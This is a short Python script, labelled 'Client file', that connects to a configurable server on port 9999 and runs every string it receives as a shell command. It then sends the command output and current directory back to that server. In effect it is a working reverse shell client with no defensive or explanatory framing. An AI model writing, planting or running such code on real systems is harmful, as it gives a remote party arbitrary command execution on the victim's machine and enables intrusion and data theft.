"""
Client file
"""
import socket
import os
import subprocess

s = socket.socket()
host = '0.0.0.0'  # change to server IP
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    # data check 
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    # check whether instruction is there or not
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd()
        s.send(str.encode(output_str + currentWD))
        # prints on clients computer
        print(output_str)




